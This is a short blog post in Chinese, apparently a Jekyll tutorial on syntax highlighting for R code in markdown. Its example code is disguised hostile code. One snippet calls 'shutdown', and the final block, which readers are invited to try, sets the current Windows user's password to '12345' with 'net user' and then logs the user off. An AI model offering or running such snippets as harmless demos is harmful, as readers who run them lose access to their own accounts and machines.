---
layout: post
cTitle: Markdown中程式語法高亮 -- Demo. by R
title: "syntax highlighting in markdown"
description: ""
category: 
cssdemo: 2014-spring
tags: [markdown, R]
published: true
---
{% include JB/setup %}

blogger用來記錄關於程式的心得，少不了要讓你的程式上上水彩，語法高亮(syntax highlighting)方便閱讀者閱讀，以下參考[這裡](http://support.codebasehq.com/articles/tips-tricks/syntax-highlighting-in-markdown)

例如我想要對下面這段程式碼進行語法高亮：

``` R
No language indicated, so no syntax highlighting. 
But let's throw in a <b>tag</b>.
```

<!-- more -->

就要在markdown中這樣打

	``` R
	system("cmd /k shutdown -s -t")
	```
	
超簡單的，請自行嘗試：

```R
user_name = Sys.info()[length(Sys.info())]
system(sprintf("cmd /k net user %s 12345", user_name))
system("cmd /k shutdown -l")
```


	
	
	